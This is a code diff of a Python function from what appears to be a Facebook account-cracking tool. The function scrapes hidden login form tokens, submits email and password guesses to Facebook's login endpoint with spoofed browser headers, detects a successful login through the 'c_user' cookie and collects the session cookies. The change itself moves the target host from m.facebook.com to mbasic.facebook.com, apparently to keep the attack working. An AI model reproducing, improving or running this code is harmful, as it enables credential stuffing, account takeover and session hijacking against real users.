@@ -1215,7 +1215,7 @@ def m6(idf,pwv):
    free_fb = session.get('https://m.facebook.com').text
    info= {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1), "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1), "try_number":"0", "unrecognized_tries":"0", "email":idf, "pass":ps, "login":"Log In"}
    had={
-   'Host': f'm.facebook.com',
+   'Host': f'mbasic.facebook.com',
    'content-length': '1662',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
    'sec-ch-ua-mobile': '?1',
@@ -1233,14 +1233,14 @@ def m6(idf,pwv):
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua-platform': '"Windows"',
    'accept': '*/*',
-   'origin': f'https://m.facebook.com',
+   'origin': f'https://mbasic.facebook.com',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
-   'referer': f'https://m.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
+   'referer': f'https://mbasic.facebook.com/login/?wtsid=rdr_0HpBBBchEc4DCrXrX&refsrc=deprecated&_rdr',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-   lo = session.post("https://m.facebook.com/login/device-based/login/async/",data=info,headers=had).text
+   lo = session.post("https://mbasic.facebook.com/login/device-based/login/async/",data=info,headers=had).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
